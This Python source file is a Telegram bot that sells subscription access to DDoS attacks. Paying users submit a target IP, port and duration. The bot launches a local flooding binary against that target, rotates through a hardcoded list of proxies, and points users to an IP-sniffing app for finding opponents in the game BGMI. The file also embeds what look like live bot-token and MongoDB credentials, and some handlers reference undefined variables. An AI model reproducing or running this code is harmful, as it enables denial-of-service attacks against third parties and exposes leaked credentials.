import os
import signal
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import random
from threading import Thread
import asyncio
import aiohttp
from telebot import types
import pytz
import psutil

loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

TOKEN = '7310628686:AAE3j-6m0KR8lwD4PbI1VjeuUyfCX9milVA'
MONGO_URI = 'mongodb+srv://Cluster0:Cluster0@cluster0.5mvg9ej.mongodb.net/danger?retryWrites=true&w=majority'
FORWARD_CHANNEL_ID = -1002379325424
CHANNEL_ID = -1002379325424
error_channel_id = -1002379325424

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO)

client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['danger']
users_collection = db.users
bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]


async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)


async def run_attack_command_async(target_ip, target_port, duration):
    try:
        # Start the attack process
        process = await asyncio.create_subprocess_shell(
            f"./dark {target_ip} {target_port} {duration} 50"
        )
        bot.attack_process = process

        # Wait for the process to complete
        await process.communicate()

    except Exception as e:
        # Log any errors during attack execution
        logging.error(f"Error during attack execution: {e}")

    finally:
        # Reset the state after the attack is completed or an error occurs
        bot.attack_in_progress = False
        bot.attack_process = None

        if bot.attack_initiator:
            # Prepare the completion message
            response = (
                f"*⚔️ Attack completed! Check out the results and let’s keep the momentum going! 🚀*\n\n"
                f"*Target Host: {target_ip}*\n"
                f"*Target Port: {target_port}*\n\n"
                "*Ready for the next challenge? Start another attack on the same target below!*"
            )

            # Create the inline keyboard markup
            markup = types.InlineKeyboardMarkup()
            restart_button = types.InlineKeyboardButton(
                text="🤧 𝗦𝗧𝗔𝗥𝗧 𝗔𝗧𝗧𝗔𝗖𝗞 𝗔𝗚𝗔𝗜𝗡 🤧",
                callback_data=f"restart_attack:{target_ip}:{target_port}:{duration}"
            )
            join_channel_button = types.InlineKeyboardButton(
                text="📢 𝗝𝗼𝗶𝗻 𝗢𝘂𝗿 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 📢", 
                url="https://t.me/+Cw8pBixUnE43M2Rl"
            )
            markup.add(join_channel_button)
            markup.add(restart_button)

            # Send the completion message
            await bot.send_message(
                bot.attack_initiator,
                response,
                parse_mode='Markdown',
                reply_markup=markup
            )

            # Reset the attack initiator
            bot.attack_initiator = None







def is_user_admin(user_id, chat_id):
    try:
        return bot.get_chat_member(
            chat_id, user_id).status in ['administrator', 'creator']
    except Exception as e:
        logging.error(f"Error checking admin status: {e}")
        return False


def extend_and_clean_expired_users():
    tz = pytz.timezone('Asia/Kolkata')
    now = datetime.now(tz)
    logging.info(f"Current Date and Time: {now}")

    users_cursor = users_collection.find()
    for user in users_cursor:
        user_id = user.get("user_id")
        username = user.get("username", "Unknown User")
        time_approved_str = user.get("time_approved")
        days = user.get("days", 0)
        valid_until_str = user.get("valid_until", "")
        approving_admin_id = user.get("approved_by")

        if valid_until_str:
            try:
                valid_until_date = datetime.strptime(valid_until_str,
                                                     "%Y-%m-%d").date()
                time_approved = datetime.strptime(
                    time_approved_str, "%I:%M:%S %p %Y-%m-%d").time(
                    ) if time_approved_str else datetime.min.time()
                valid_until_datetime = datetime.combine(
                    valid_until_date, time_approved)
                valid_until_datetime = tz.localize(valid_until_datetime)

                if now > valid_until_datetime:
                    try:
                        bot.send_message(user_id, (
                            f"*⚠️ Your access has been removed. Your access expired on {valid_until_datetime.strftime('%Y-%m-%d %I:%M:%S %p')}.\n"
                            f"Approval Time: {time_approved_str if time_approved_str else 'N/A'}\n"
                            f"Valid Until: {valid_until_datetime.strftime('%Y-%m-%d %I:%M:%S %p')}\n"
                            f"If you believe this is a mistake or want to renew your access, please contact support. 💬*"
                        ),
                                         parse_mode='Markdown')

                        if approving_admin_id:
                            bot.send_message(approving_admin_id, (
                                f"*🔴 User {username} (ID: {user_id}) has been automatically removed due to expired approval.\n"
                                f"Approval Time: {time_approved_str if time_approved_str else 'N/A'}\n"
                                f"Valid Until: {valid_until_datetime.strftime('%Y-%m-%d %I:%M:%S %p')}\n"
                                f"Status: Removed*"),
                                             parse_mode='Markdown')
                    except Exception as e:
                        logging.error(
                            f"Failed to send message for user {user_id}: {e}")

                    result = users_collection.delete_one({"user_id": user_id})
                    if result.deleted_count > 0:
                        logging.info(
                            f"User {user_id} has been removed from database")
                    else:
                        logging.warning(
                            f"Failed to remove user {user_id} from database")
            except ValueError as e:
                logging.error(f"Failed to parse date for user {user_id}: {e}")

    logging.info("Approval times extension and cleanup completed")


def update_proxy():
    proxy_list = [
        "https://43.134.234.74:443", "https://175.101.18.21:5678", "https://179.189.196.52:5678", 
        "https://162.247.243.29:80", "https://173.244.200.154:44302", "https://173.244.200.156:64631", 
        "https://207.180.236.140:51167", "https://123.145.4.15:53309", "https://36.93.15.53:65445", 
        "https://1.20.207.225:4153", "https://83.136.176.72:4145", "https://115.144.253.12:23928", 
        "https://78.83.242.229:4145", "https://128.14.226.130:60080", "https://194.163.174.206:16128", 
        "https://110.78.149.159:4145", "https://190.15.252.205:3629", "https://101.43.191.233:2080", 
        "https://202.92.5.126:44879", "https://221.211.62.4:1111", "https://58.57.2.46:10800", 
        "https://45.228.147.239:5678", "https://43.157.44.79:443", "https://103.4.118.130:5678", 
        "https://37.131.202.95:33427", "https://172.104.47.98:34503", "https://216.80.120.100:3820", 
        "https://182.93.69.74:5678", "https://8.210.150.195:26666", "https://49.48.47.72:8080", 
        "https://37.75.112.35:4153", "https://8.218.134.238:10802", "https://139.59.128.40:2016", 
        "https://45.196.151.120:5432", "https://24.78.155.155:9090", "https://212.83.137.239:61542", 
        "https://46.173.175.166:10801", "https://103.196.136.158:7497", "https://82.194.133.209:4153", 
        "https://210.4.194.196:80", "https://88.248.2.160:5678", "https://116.199.169.1:4145", 
        "https://77.99.40.240:9090", "https://143.255.176.161:4153", "https://172.99.187.33:4145", 
        "https://43.134.204.249:33126", "https://185.95.227.244:4145", "https://197.234.13.57:4145", 
        "https://81.12.124.86:5678", "https://101.32.62.108:1080", "https://192.169.197.146:55137", 
        "https://82.117.215.98:3629", "https://202.162.212.164:4153", "https://185.105.237.11:3128", 
        "https://123.59.100.247:1080", "https://192.141.236.3:5678", "https://182.253.158.52:5678", 
        "https://164.52.42.2:4145", "https://185.202.7.161:1455", "https://186.236.8.19:4145", 
        "https://36.67.147.222:4153", "https://118.96.94.40:80", "https://27.151.29.27:2080", 
        "https://181.129.198.58:5678", "https://200.105.192.6:5678", "https://103.86.1.255:4145", 
        "https://171.248.215.108:1080", "https://181.198.32.211:4153", "https://188.26.5.254:4145", 
        "https://34.120.231.30:80", "https://103.23.100.1:4145", "https://194.4.50.62:12334", 
        "https://201.251.155.249:5678", "https://37.1.211.58:1080", "https://86.111.144.10:4145", 
        "https://80.78.23.49:1080"
    ]
    proxy = random.choice(proxy_list)
    telebot.apihelper.proxy = {'https': proxy}
    logging.info("Proxy updated successfully.")


@bot.message_handler(commands=['update_proxy'])
def update_proxy_command(message):
    chat_id = message.chat.id
    try:
        update_proxy()
        bot.send_message(chat_id, "*🔄 Proxy updated successfully.*")
    except Exception as e:
        bot.send_message(chat_id, f"*❌ Failed to update proxy: {e}*")


@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_admin = is_user_admin(user_id, CHANNEL_ID)
    cmd_parts = message.text.split()

    if not is_admin:
        bot.send_message(
            chat_id,
            "*🚫 Access denied! You don't have permission to use this command.*",
            parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(
            chat_id,
            "*⚠️ Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>*",
            parse_mode='Markdown')
        return

    action = cmd_parts[0]

    try:
        target_user_id = int(cmd_parts[1])
    except ValueError:
        bot.send_message(chat_id,
                         "*⚠️ Error: [user_id] must be an integer!*",
                         parse_mode='Markdown')
        return

    target_username = message.reply_to_message.from_user.username if message.reply_to_message else None

    try:
        plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
        days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0
    except ValueError:
        bot.send_message(chat_id,
                         "*⚠️ Error: <plan> and <days> must be integers!*",
                         parse_mode='Markdown')
        return

    tz = pytz.timezone('Asia/Kolkata')
    now = datetime.now(tz).date()

    if action == '/approve':
        valid_until = (
            now +
            timedelta(days=days)).isoformat() if days > 0 else now.isoformat()
        time_approved = datetime.now(tz).strftime("%I:%M:%S %p %Y-%m-%d")
        users_collection.update_one({"user_id": target_user_id}, {
            "$set": {
                "user_id": target_user_id,
                "username": target_username,
                "plan": plan,
                "days": days,
                "valid_until": valid_until,
                "approved_by": user_id,
                "time_approved": time_approved,
                "access_count": 0
            }
        },
                                    upsert=True)

        # Message to the approving admin
        bot.send_message(
            chat_id,
            f"*✅ User {target_user_id} has been approved with plan {plan} for {days} days.*",
            parse_mode='Markdown')

        # Message to the target user
        bot.send_message(
            target_user_id,
            f"*🎉 Congratulations! Your account has been approved with plan {plan} for {days} days. You can now use the /attack command. Thanks for purchasing!*",
            parse_mode='Markdown')

        # Message to the channel
        bot.send_message(
            CHANNEL_ID,
            f"*🔔 User {target_user_id} (@{target_username}) has been approved by {user_id}.*",
            parse_mode='Markdown')

    elif action == '/disapprove':
        users_collection.delete_one({"user_id": target_user_id})
        bot.send_message(
            chat_id,
            f"*❌ User {target_user_id} has been disapproved and removed.*",
            parse_mode='Markdown')

        # Message to the target user
        bot.send_message(
            target_user_id,
            "*🚫 Your account has been disapproved and removed from the system.*",
            parse_mode='Markdown')

        # Message to the channel
        bot.send_message(
            CHANNEL_ID,
            f"*🔕 User {target_user_id} has been disapproved by {user_id} and removed from the system.*",
            parse_mode='Markdown')




# Initialize attack flag, duration, start time, and initiator's user ID
bot.attack_in_progress = False
bot.attack_duration = 0
bot.attack_start_time = 0
bot.attack_initiator = None


# Your initial settings, bot initialization, etc.

@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    markup = types.InlineKeyboardMarkup()
    button1 = types.InlineKeyboardButton(text="🔥 𝗔𝗽𝗽𝗿𝗼𝘃𝗲 𝗡𝗼𝘄 𝗡𝗼𝘄 🔥", url="https://t.me/DarkDdosOwner")
    button2 = types.InlineKeyboardButton(text="💰 𝗮𝗻𝗱 𝗣𝗿𝗶𝗰𝗲 𝗟𝗶𝘀𝘁 𝗛𝗲𝗿𝗲 💰", url="https://t.me/c/DarkDdosHack/1035")
    markup.add(button1)
    markup.add(button2)

    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data or user_data.get('plan', 0) == 0:
            bot.send_message(
                chat_id,
                "*❌ Access Denied! ❌*\n\n*You are not approved to use this bot.*\n\nApproval required. Contact the owner [@DarkDdosOwner] 🔒",
                parse_mode='Markdown',
                reply_markup=markup)
            return

        if bot.attack_in_progress:
            remaining_time = int(bot.attack_duration - (time.time() - bot.attack_start_time))
            bot.send_message(
                chat_id,
                f"*⚠️ Hold on! The bot is currently in another attack.*\n\n*Remaining Time: {remaining_time} seconds.*\n\n*Please wait patiently.*",
                parse_mode='Markdown')
            return

        bot.send_message(
            chat_id,
            "*🔥 Ready to launch an attack? 🔥*\n\n*Provide the target IP, port, and duration in seconds.*\n\nExample: 167.67.25 6296 180",
            parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command)

    except Exception as e:
        logging.error(f"Error in attack command: {e}")


def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(
                message.chat.id,
                "*❌ Error! ❌ Incorrect format.*\n\n*Provide the correct data: Target IP, Target Port, and Duration in Seconds.*",
                parse_mode='Markdown')
            return

        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

        if target_port in blocked_ports:
            bot.send_message(
                message.chat.id,
                f"*🚫 Port {target_port} is blocked! 🚫*\n\n*Select a different port and try again.*",
                parse_mode='Markdown')
            return

        if duration >= 600:
            bot.send_message(
                message.chat.id,
                "*⏳ Maximum duration is 1600 seconds! ⏳*\n\n*Shorten the duration and try again.*",
                parse_mode='Markdown')
            return

        bot.attack_in_progress = True
        bot.attack_duration = duration
        bot.attack_start_time = time.time()
        bot.attack_initiator = message.from_user.id
        bot.last_target_ip = target_ip
        bot.last_target_port = target_port

        # Start the attack
        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)

        response = (
            f"*⚔️ Attack Launched! ⚔️*\n\n"
            f"*Target Host: {target_ip}*\n"
            f"*Target Port: {target_port}*\n"
            f"*Duration: {duration} seconds*\n\n"
            "*Let the chaos begin! 🔥 Inflame the battlefield! ⚡ Clear the scene with your hands! 💥 Goal: Clear hits and make a mark! 🎯*"
        )

        markup = types.InlineKeyboardMarkup()
        button3 = types.InlineKeyboardButton(text="📢 𝗝𝗼𝗶𝗻 𝗢𝘂𝗿 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 📢", url="https://t.me/+Cw8pBixUnE43M2Rl")
        stop_button = types.InlineKeyboardButton(text="🛑 Stop Attack", callback_data="stop_attack")
        markup.add(button3)
        markup.add(stop_button)

        bot.send_message(message.chat.id, response, parse_mode='Markdown', reply_markup=markup)

    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")


@bot.callback_query_handler(func=lambda call: call.data == "stop_attack")
def handle_stop_attack(call):
    try:
        if bot.attack_in_progress and call.from_user.id == bot.attack_initiator:
            # Find and send SIGINT (Ctrl+C) to the bgmi process
            for proc in psutil.process_iter(['pid', 'name']):
                if 'bgmi' in proc.info['name']:
                    os.kill(proc.info['pid'], signal.SIGINT)
                    break

            # Capture the last target details
            last_target_ip = bot.last_target_ip
            last_target_port = bot.last_target_port
            last_duration = bot.attack_duration

            # Reset the bot state
            bot.attack_in_progress = False
            bot.attack_duration = 0
            bot.attack_start_time = 0
           # bot.attack_initiator = None

            # Message with inline buttons
            join_channel_button = types.InlineKeyboardButton(
                text="📢 𝗝𝗼𝗶𝗻 𝗢𝘂𝗿 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 📢", 
                url="https://t.me/+Cw8pBixUnE43M2Rl"
            )
            markup.add(restart_button, join_channel_button)

            bot.send_message(
                call.message.chat.id,
                "*🛑 Attack Stopped Successfully! 🛑*\n\n*You can restart the attack by pressing the button below.*",
                parse_mode='Markdown',
                reply_markup=markup
            )
        else:
            markup = types.InlineKeyboardMarkup()
            join_channel_button = types.InlineKeyboardButton(
                text="📢 𝗝𝗼𝗶𝗻 𝗢𝘂𝗿 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 📢", 
                url="https://t.me/+Cw8pBixUnE43M2Rl"
            )
            markup.add(join_channel_button)
            bot.send_message(
                call.message.chat.id,
                "*❌ No attack in progress or you are not the initiator.*",
                parse_mode='Markdown',
                reply_markup=markup
            )
    except Exception as e:
        logging.error(f"Error in stop attack callback: {e}")


@bot.callback_query_handler(func=lambda call: call.data.startswith("restart_attack"))
def handle_restart_attack(call):
    try:
        # Parse the callback data to get target details
        _, target_ip, target_port, duration = call.data.split(":")
        target_port = int(target_port)
        duration = int(duration)

        # Restart the attack
        bot.attack_in_progress = True
        bot.attack_duration = duration
        bot.attack_start_time = time.time()

        asyncio.run_coroutine_threadsafe(
            run_attack_command_async(target_ip, target_port, duration), loop)

        response = (
            f"*⚔️ Attack Restarted! ⚔️*\n\n"
            f"*Target Host: {target_ip}*\n"
            f"*Target Port: {target_port}*\n"
            f"*Duration: {duration} seconds*\n\n"
            "*Let the chaos begin! 🔥 Inflame the battlefield! ⚡ Clear the scene with your hands! 💥 Goal: Clear hits and make a mark! 🎯*"
        )

        markup = types.InlineKeyboardMarkup()
        join_channel_button = types.InlineKeyboardButton(
            text="📢 𝗝𝗼𝗶𝗻 𝗢𝘂𝗿 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 📢", 
            url="https://t.me/+Cw8pBixUnE43M2Rl"
        )
        stop_button = types.InlineKeyboardButton(text="🛑 Stop Attack", callback_data="stop_attack")
        markup.add(join_channel_button) 
        markup.add(stop_button)

        bot.send_message(call.message.chat.id,
                         response,
                         parse_mode='Markdown',
                         reply_markup=markup)

    except Exception as e:
        logging.error(f"Error in restart attack callback: {e}")







def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())


@bot.message_handler(commands=['myinfo'])
def myinfo_command(message):
    try:
        user_id = message.from_user.id
        user_data = users_collection.find_one({"user_id": user_id})

        # Set timezone and format date/time
        tz = pytz.timezone('Asia/Kolkata')
        now = datetime.now(tz)
        current_date = now.date().strftime("%Y-%m-%d")
        current_time = now.strftime("%I:%M:%S %p")

        if not user_data:
            response = (
                "*⚠️ No account information found. ⚠️*\n\n"
                "*Please contact the owner for assistance.*\n\n"
                "You can reach out here: [Owner](https://t.me/DarkDdosOwner) 🔒\n"
                "Or check the price list here: [Price List](https://t.me/DarkDdosHack/1035) 💰"
            )
            markup = types.InlineKeyboardMarkup()
            button1 = types.InlineKeyboardButton(text="📞 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘄𝗻𝗲𝗿 📞",
                                                 url="https://t.me/DarkDdosOwner")
            button2 = types.InlineKeyboardButton(
                text="💸 𝗣𝗿𝗶𝗰𝗲 𝗟𝗶𝘀𝘁 💸", url="https://t.me/c/DarkDdosHack/1035")
            markup.add(button1)
            markup.add(button2)
        else:
            username = message.from_user.username or "Unknown User"
            plan = user_data.get('plan', 'N/A')
            valid_until = user_data.get('valid_until', 'N/A')

            response = (
                f"*👤 Username: @{username}*\n"
                f"*💼 Plan: {plan}₹*\n"
                f"*📅 Valid Until: {valid_until}*\n"
                f"*📆 Current Date: {current_date}*\n"
                f"*🕒 Current Time: {current_time}*\n\n"
                "*Thank you for being with us! If you need help, just ask. 💬*")
            markup = types.InlineKeyboardMarkup()
            button = types.InlineKeyboardButton(
                text="📢 𝗝𝗼𝗶𝗻 𝗢𝘂𝗿 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 📢", url="https://t.me/+Cw8pBixUnE43M2Rl")
            markup.add(button)

        bot.send_message(message.chat.id,
                         response,
                         parse_mode='Markdown',
                         reply_markup=markup)
    except Exception as e:
        print(f"Error handling /myinfo command: {e}")


@bot.message_handler(commands=['rules'])
def rules_command(message):
    rules_text = (
        "*📜 Rules:*\n"
        "*1. 🚫 No spamming. Please wait 5-6 matches between attacks.*\n"
        "*2. 🔫 Limit your kills to 30-40.*\n"
        "*3. ⚖️ Play fair. Avoid cheating and reports.*\n"
        "*4. 🛑 No mods or hacked files.*\n"
        "*5. 🤝 Be courteous. Communicate respectfully.*\n"
        "*6. 📩 Report issues to [@DarkDdosOwner].*\n\n"
        "*Follow the rules and have fun! 🎉*")
    markup = types.InlineKeyboardMarkup()
    button = types.InlineKeyboardButton(text="📞 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗨𝘀 📞",
                                        url="https://t.me/DarkDdosOwner")
    markup.add(button)
    try:
        bot.send_message(message.chat.id,
                         rules_text,
                         parse_mode='Markdown',
                         reply_markup=markup)
    except Exception as e:
        print(f"Error handling /rules command: {e}")


@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = ("*💥 Welcome to the Ultimate Bot! 💥*\n\n"
                 "*Commands you can use:*\n"
                 "*1. 🚀 /attack - Launch an attack.*\n"
                 "*2. 🔍 /myinfo - Check your details.*\n"
                 "*3. 👑 /owner - Get owner info.*\n"
                 "*4. 📡 /canary - Get the latest version.*\n"
                 "*5. 📜 /rules - Review the rules.*\n\n"
                 "*If you have any questions, just ask! 💬*")
    markup = types.InlineKeyboardMarkup()
    button1 = types.InlineKeyboardButton(text="📞 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗨𝘀 📞",
                                         url="https://t.me/DarkDdosOwner")
    button2 = types.InlineKeyboardButton(text="💸 𝗦𝗲𝗲 𝗣𝗿𝗶𝗰𝗲𝘀 💸",
                                         url="https://t.me/c/DarkDdosHack/1035")
    markup.add(button1) 
    markup.add(button2)
    try:
        bot.send_message(message.chat.id,
                         help_text,
                         parse_mode='Markdown',
                         reply_markup=markup)
    except Exception as e:
        print(f"Error handling /help command: {e}")


@bot.message_handler(commands=['owner'])
def owner_command(message):
    response = (
        "*👑 Owner Information:*\n\n"
        "*For questions, feedback, or feature requests, reach out to the owner here:*\n\n"
        "Telegram: [@DarkDdosOwner] 📞\n\n"
        "*Your feedback helps us improve. Thanks for being part of our community! 🌟*"
    )
    markup = types.InlineKeyboardMarkup()
    button = types.InlineKeyboardButton(text="📞 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗨𝘀 📞",
                                        url="https://t.me/DarkDdosOwner")
    markup.add(button)
    try:
        bot.send_message(message.chat.id,
                         response,
                         parse_mode='Markdown',
                         reply_markup=markup)
    except Exception as e:
        print(f"Error handling /owner command: {e}")


@bot.message_handler(commands=['start'])
def start_message(message):
    markup = types.InlineKeyboardMarkup()
    button1 = types.InlineKeyboardButton(text="💰 𝗕𝘂𝘆 𝗳𝗿𝗼𝗺 𝘁𝗵𝗲 𝗠𝗮𝘀𝘁𝗲𝗿 💰",
                                         url="https://t.me/DarkDdosOwner")
    button2 = types.InlineKeyboardButton(text="💸 𝗖𝗵𝗲𝗰𝗸 𝗣𝗿𝗶𝗰𝗲𝘀 𝗡𝗼𝘄 💸",
                                         url="https://t.me/DarkDdosHack/1035")
    button3 = types.InlineKeyboardButton(text="💻 𝗝𝗼𝗶𝗻 𝘁𝗵𝗲 𝗛𝗮𝗰𝗸𝗶𝗻𝗴 𝗦𝗾𝘂𝗮𝗱 💻",
                                         url="https://t.me/+Cw8pBixUnE43M2Rl")

    markup.add(button1)
    markup.add(button2)
    markup.add(button3)

    try:
        bot.send_message(
            message.chat.id, "*🔥 Welcome to the DDoS Realm! 🔥*\n\n"
            "*🚀 Start with `/attack`. Provide IP, port, and duration. You're in control. 🚀*\n\n"
            "*💥 Type `/attack` followed by target IP, port, and duration. 💥*\n\n"
            "*🆕 New here? Hit `/help` for guidance. 🆕*\n\n"
            "*⚠️ Warning: Power comes with a cost. Are you ready? ⚠️*",
            parse_mode='Markdown',
            reply_markup=markup)
    except Exception as e:
        print(f"Error while processing /start command: {e}")


@bot.message_handler(commands=['canary'])
def canary_command(message):
    response = ("*📥 Download the HttpCanary APK now! 📥*\n\n"
                "*🔍 Track IP addresses easily. 🔍*\n\n"
                "*💡 Use it wisely to stay ahead. 💡*")

    markup = types.InlineKeyboardMarkup()
    button1 = types.InlineKeyboardButton(
        text="📱 𝗖𝗮𝗻𝗮𝗿𝘆 𝗔𝗣𝗞 𝗖𝗹𝗶𝗰𝗸 📱",
        url="https://t.me/DarkDdosHack/88")
    button2 = types.InlineKeyboardButton(
        text="🍎 𝗖𝗮𝗻𝗮𝗿𝘆 𝗳𝗼𝗿 𝗶𝗢𝗦 🍎",
        url="https://apps.apple.com/in/app/surge-5/id1442620678")

    markup.add(button1)
    markup.add(button2)

    try:
        bot.send_message(message.chat.id,
                         response,
                         parse_mode='Markdown',
                         reply_markup=markup)
    except Exception as e:
        print(f"Error while processing /cary command: {e}")


if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    extend_and_clean_expired_users()
    logging.info("Starting Codespace activity keeper and Telegram bot...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")

        logging.info(
            f"Waiting for {REQUEST_INTERVAL} seconds before the next request..."
        )
        time.sleep(REQUEST_INTERVAL)

